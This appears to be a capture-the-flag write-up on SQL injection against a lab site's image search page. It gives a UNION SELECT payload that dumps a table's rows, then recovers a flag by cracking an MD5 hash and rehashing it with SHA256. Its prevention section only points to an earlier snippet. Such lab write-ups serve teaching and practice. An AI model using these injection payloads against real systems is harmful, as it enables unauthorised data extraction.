# SQL Injection: Searc Images

In the same way as the members page, the search images page has an input field to search for images. Let's do the same process to check if the input is vulnerable to SQL injection. When we list the tables, we can see a `list_images` table with the following columns:
```
comment,title,url,id
```
Now list the rows of the `list_images` table:
```SQL
1 UNION ALL SELECT id, CONCAT(0xa, comment, 0xa, title, 0xa, url) FROM list_images
```
One of the rows is:
```
Title: 
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Hack me ?
borntosec.ddns.net/images.png
Url : 5
```
If we decode `1928e8083cf461a51303633093573c46` in MD5 we get `albatroz`. Then encrypt it with SHA256 and lower all:
```bash
echo -n "albatroz" | sha256sum | cut -d ' ' -f 1
```
We get the flag.

# How to prevent it
Same as the previous snippet.